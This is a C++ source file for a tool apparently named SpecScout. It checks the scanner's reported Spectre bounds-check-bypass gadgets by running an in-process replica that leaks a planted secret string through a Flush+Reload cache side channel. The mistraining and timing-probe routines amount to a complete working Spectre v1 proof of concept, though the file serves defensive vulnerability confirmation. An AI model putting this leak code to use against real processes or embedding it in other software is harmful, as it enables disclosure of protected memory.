// harness.cpp — dynamic Flush+Reload confirmation for SpecScout findings.
//
// SpecScout's static pass reports candidate `a[b[i]]` (S1) and `b[i]()` (S2)
// gadgets to a JSON report. This harness reads that report and, for each S1
// finding, runs an in-process replica of the flagged gadget on the host CPU:
// it builds the same bounds-check-bypass shape, mistrains the guard, delays the
// transmit load by the finding's reported speculative distance, and recovers a
// known secret through the array2[] cache side channel. A clean recovery proves
// the gadget CLASS is exploitable on this microarchitecture and that the
// speculation window reaches the reported distance.
//
// What it does NOT do: execute the target binary's code at the reported address.
// Confirming an in-binary gadget in situ — especially a kernel-mode ntoskrnl /
// driver gadget — requires a privileged, target-specific harness (mapping the
// image, driving the real syscall/IOCTL inputs, and sharing the reload buffer
// with the victim). That is out of scope for this in-process confirmer; S2
// (indirect-branch / BTB) confirmation is likewise out of scope here and such
// findings are listed for manual review rather than silently "confirmed".
//
// Usage:
//   specscout_confirm                      self-test (built-in S1 gadget)
//   specscout_confirm <report.json>        confirm each S1 finding in the report
//   specscout_confirm <report.json> --limit N   leak-test at most N findings (0 = all)
//
// x86-64 only (clflush / rdtscp). Build: cl /O2 /std:c++17 harness.cpp
#include <cctype>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>

#if defined(_MSC_VER)
#include <intrin.h>
#else
#include <x86intrin.h>
#endif
#if defined(_WIN32)
#include <windows.h>
#endif

#define STRIDE 512
// Non-static globals + a non-inlined victim so array1_size is genuinely
// reloaded (and clflush-able) on each call, giving a real speculation window.
uint8_t  array1[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
size_t   array1_size = 16;
uint8_t  array2[256 * STRIDE];
const char secret[] = "SpecScout!";   // lives past array1 in memory
volatile uint8_t sink = 0;
// A provably-opaque zero: adds nothing to the address but, being volatile, the
// compiler cannot fold `acc & g_zero` away, so the dependent filler chain below
// genuinely delays the transmit load (models a finding's speculative distance).
volatile size_t g_zero = 0;

#if defined(_MSC_VER)
#define NOINLINE __declspec(noinline)
#else
#define NOINLINE __attribute__((noinline))
#endif

// The gadget SpecScout flags as S1: a[b[i]] with a mistrainable bounds check.
// `fill` dependent ops are inserted between the inner load and the transmit so
// the transmit happens ~`fill` instructions deep into the speculative window,
// mirroring the finding's reported guard->sink distance.
NOINLINE static void victim(size_t x, int fill) {
    if (x < array1_size) {
        uint8_t b = array1[x];
        size_t acc = x + 1;
        // One cheap dependent op per unit so `fill` tracks instruction-scale
        // guard->sink distance rather than multiply latency.
        for (int i = 0; i < fill; i++)
            acc += (acc >> 2) | 1;
        sink = array2[(size_t)b * STRIDE + (acc & g_zero)];
    }
}

static inline uint64_t probe(volatile uint8_t* p) {
    unsigned aux; _mm_mfence(); _mm_lfence();
    uint64_t t0 = __rdtscp(&aux); _mm_lfence();
    (void)*p; _mm_lfence();
    uint64_t t1 = __rdtscp(&aux); _mm_lfence();
    return t1 - t0;
}

static int threshold() {
    volatile uint8_t* p = &array2[0]; *p = 1;
    uint64_t hit = 0, miss = 0; const int N = 10000;
    for (int i = 0; i < N; i++) { (void)*p; hit += probe(p); }
    for (int i = 0; i < N; i++) { _mm_clflush((void*)p); _mm_mfence(); miss += probe(p); }
    hit /= N; miss /= N;
    printf("[calib] cached ~%llu  uncached ~%llu cyc\n",
           (unsigned long long)hit, (unsigned long long)miss);
    return (miss <= hit + 20) ? (int)(hit + 40) : (int)(hit + (miss - hit) / 4);
}

static uint8_t leak_byte(size_t mal_x, int thr, int fill, int* score_out) {
    static int results[256];
    memset(results, 0, sizeof(results));
    for (int tries = 999; tries > 0; tries--) {
        for (int i = 0; i < 256; i++) _mm_clflush(&array2[i * STRIDE]);
        _mm_mfence();
        size_t train = tries % array1_size;
        for (int j = 29; j >= 0; j--) {
            _mm_clflush(&array1_size);
            for (volatile int z = 0; z < 100; z++) {}
            size_t x = ((j % 6) - 1) & ~0xFFFFull;  // ~0 every 6th iter, else 0
            x = (x | (x >> 16));
            x = train ^ (x & (mal_x ^ train));       // branchless select
            victim(x, fill);
        }
        uint64_t best = ~0ull; int best_i = -1;
        int exclude = array1[tries % array1_size];
        for (int i = 0; i < 256; i++) {
            int mix = ((i * 167) + 13 + tries * 3) & 255;  // rotate vs prefetcher
            if (mix == exclude) continue;
            uint64_t t = probe(&array2[mix * STRIDE]);
            if (t < best) { best = t; best_i = mix; }
        }
        if (best_i >= 0 && (int)best <= thr) results[best_i]++;
    }
    int top = 0;
    for (int i = 1; i < 256; i++) if (results[i] > results[top]) top = i;
    *score_out = results[top];
    return (uint8_t)top;
}

// Recover the planted secret through the gadget at speculative distance `fill`.
// Returns the number of correctly recovered bytes; `*len_out` gets the total.
static int confirm_s1(int thr, int fill, int* len_out, bool verbose) {
    size_t mal = (size_t)((intptr_t)secret - (intptr_t)array1);
    int len = (int)sizeof(secret) - 1, ok = 0;
    *len_out = len;
    for (int i = 0; i < len; i++) {
        int score = 0;
        uint8_t v = leak_byte(mal + i, thr, fill, &score);
        char c = (v > 31 && v < 127) ? (char)v : '?';
        bool good = score >= 5;
        if (good && c == secret[i]) ok++;
        if (verbose)
            printf("    byte %2d: 0x%02X '%c'  hits=%d  %s\n", i, v, c, score,
                   good ? "" : "(weak)");
    }
    return ok;
}

// ----------------------------------------------------------------------------
// Minimal JSON reader for SpecScout's own report format (flat finding objects
// of string/number values). Not a general parser; dependency-free on purpose.
// ----------------------------------------------------------------------------
struct Finding {
    std::string kind, guard_text, sink_text, source_api;
    uint64_t    function = 0, guard = 0, sink = 0;
    int         confidence = 0, spec_distance = 0;
};

// Pull the value for `key` out of one finding object's text. String values are
// returned unescaped; numeric/other tokens are returned verbatim.
static bool field(const std::string& obj, const char* key, std::string& out) {
    std::string pat = std::string("\"") + key + "\"";
    size_t p = 0;
    while ((p = obj.find(pat, p)) != std::string::npos) {
        size_t q = p + pat.size();
        while (q < obj.size() && std::isspace((unsigned char)obj[q])) q++;
        if (q >= obj.size() || obj[q] != ':') { p += pat.size(); continue; }  // key inside a value
        q++;
        while (q < obj.size() && std::isspace((unsigned char)obj[q])) q++;
        if (q >= obj.size()) return false;
        if (obj[q] == '"') {
            std::string v;
            for (++q; q < obj.size() && obj[q] != '"'; ++q) {
                if (obj[q] == '\\' && q + 1 < obj.size()) {
                    char c = obj[++q];
                    v += (c == 'n') ? '\n' : c;
                } else {
                    v += obj[q];
                }
            }
            out.swap(v);
        } else {
            size_t s = q;
            while (q < obj.size() && obj[q] != ',' && obj[q] != '}' &&
                   !std::isspace((unsigned char)obj[q])) q++;
            out = obj.substr(s, q - s);
        }
        return true;
    }
    return false;
}

static uint64_t field_u64(const std::string& obj, const char* key) {
    std::string v;  // VAs are stored as "0x..." strings; base 0 handles the prefix
    return field(obj, key, v) ? std::strtoull(v.c_str(), nullptr, 0) : 0;
}
static int field_int(const std::string& obj, const char* key) {
    std::string v;
    return field(obj, key, v) ? std::atoi(v.c_str()) : 0;
}

// Split the "findings" array into its top-level object substrings.
static std::vector<std::string> split_findings(const std::string& text) {
    std::vector<std::string> objs;
    size_t fp = text.find("\"findings\"");
    size_t lb = text.find('[', fp == std::string::npos ? 0 : fp);
    if (lb == std::string::npos) return objs;
    int depth = 0; bool instr = false; size_t start = 0;
    for (size_t i = lb; i < text.size(); ++i) {
        char c = text[i];
        if (instr) {
            if (c == '\\') { ++i; continue; }
            if (c == '"') instr = false;
            continue;
        }
        if (c == '"') { instr = true; continue; }
        if (c == '{') { if (depth++ == 0) start = i; }
        else if (c == '}') { if (--depth == 0) objs.push_back(text.substr(start, i - start + 1)); }
        else if (c == ']' && depth == 0) break;
    }
    return objs;
}

static bool load_report(const std::string& path, std::string& target,
                        std::vector<Finding>& out) {
    std::ifstream in(path, std::ios::binary);
    if (!in) return false;
    std::stringstream ss; ss << in.rdbuf();
    std::string text = ss.str();

    std::string tgt;
    { size_t tp = text.find("\"target\""); if (tp != std::string::npos) {
          // reuse field() on a slice starting at the target key
          field(text.substr(tp, text.find('\n', tp) == std::string::npos
                                    ? text.size() - tp
                                    : text.find('\n', tp) - tp + 1),
                "target", tgt); } }
    target = tgt;

    for (const std::string& o : split_findings(text)) {
        Finding f;
        field(o, "kind", f.kind);
        field(o, "guard_text", f.guard_text);
        field(o, "sink_text", f.sink_text);
        field(o, "source_api", f.source_api);
        f.function      = field_u64(o, "function");
        f.guard         = field_u64(o, "guard");
        f.sink          = field_u64(o, "sink");
        f.confidence    = field_int(o, "confidence");
        f.spec_distance = field_int(o, "spec_distance");
        out.push_back(std::move(f));
    }
    return true;
}

static void pin_cpu() {
#if defined(_WIN32)
    SetThreadAffinityMask(GetCurrentThread(), 1ull << 2);
    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
#endif
}

static const int kMaxFill = 200;  // cap the modelled window (ROB is finite)

int main(int argc, char** argv) {
    pin_cpu();
    for (size_t i = 0; i < sizeof(array2); i++) array2[i] = 1;  // map pages

    std::string report;
    int limit = 20;  // leak-test at most this many findings by default (0 = all)
    for (int i = 1; i < argc; ++i) {
        if (std::strcmp(argv[i], "--limit") == 0 && i + 1 < argc) limit = std::atoi(argv[++i]);
        else if (std::strcmp(argv[i], "--all") == 0) limit = 0;
        else if (argv[i][0] != '-') report = argv[i];
    }

    int thr = threshold();

    // --- self-test: no report given -----------------------------------------
    if (report.empty()) {
        printf("[confirm] no report given; self-testing the built-in S1 gadget:\n");
        int len = 0, ok = confirm_s1(thr, 0, &len, true);
        printf("\n[confirm] recovered %d/%d bytes -> gadget is %s\n", ok, len,
               ok >= len - 1 ? "EXPLOITABLE (leak confirmed)" : "not confirmed on this run");
        return ok >= len - 1 ? 0 : 1;
    }

    // --- report-driven confirmation -----------------------------------------
    std::string target;
    std::vector<Finding> fs;
    if (!load_report(report, target, fs)) {
        fprintf(stderr, "error: could not read report %s\n", report.c_str());
        return 2;
    }
    int n_s1 = 0, n_s2 = 0;
    for (const Finding& f : fs) (f.kind.rfind("S2", 0) == 0 ? n_s2 : n_s1)++;

    printf("\n=== specscout_confirm ===\n");
    printf("report  : %s\n", report.c_str());
    printf("target  : %s\n", target.empty() ? "(unknown)" : target.c_str());
    printf("findings: %zu  (S1=%d  S2=%d)\n", fs.size(), n_s1, n_s2);
    printf("note    : in-process replica on THIS CPU; proves the gadget class and\n"
           "          speculation window, not execution of the target's own code.\n\n");

    int tested = 0, confirmed = 0, s2_skipped = 0;
    for (size_t i = 0; i < fs.size(); ++i) {
        const Finding& f = fs[i];
        bool is_s2 = (f.kind.rfind("S2", 0) == 0);
        printf("[#%zu] %-10s fn=0x%llx guard=0x%llx -> sink=0x%llx  dist=+%d\n",
               i, f.kind.c_str(), (unsigned long long)f.function,
               (unsigned long long)f.guard, (unsigned long long)f.sink, f.spec_distance);

        if (is_s2) {
            printf("      S2 indirect-branch (BTB) confirmation is out of scope for the\n"
                   "      in-process harness; listed for manual review.\n\n");
            s2_skipped++;
            continue;
        }
        if (limit != 0 && tested >= limit) {
            printf("      (skipped: --limit %d reached; pass --all to test every finding)\n\n",
                   limit);
            continue;
        }

        int fill = f.spec_distance;
        bool clamped = false;
        if (fill < 0) fill = 0;
        if (fill > kMaxFill) { fill = kMaxFill; clamped = true; }

        int len = 0, ok = confirm_s1(thr, fill, &len, false);
        tested++;
        bool good = ok >= len - 1;
        if (good) confirmed++;
        printf("      recovered %d/%d bytes -> %s%s\n\n", ok, len,
               good ? "S1 class EXPLOITABLE on this CPU" : "not confirmed on this run",
               clamped ? " (distance clamped to window cap)" : "");
    }

    printf("=== summary: %d/%d S1 tested confirmed; %d S2 listed for manual review ===\n",
           confirmed, tested, s2_skipped);
    if (tested == 0)
        printf("(no S1 findings leak-tested%s)\n",
               n_s1 > 0 ? " — raise --limit or pass --all" : "");
    return (tested > 0 && confirmed < tested) ? 1 : 0;
}
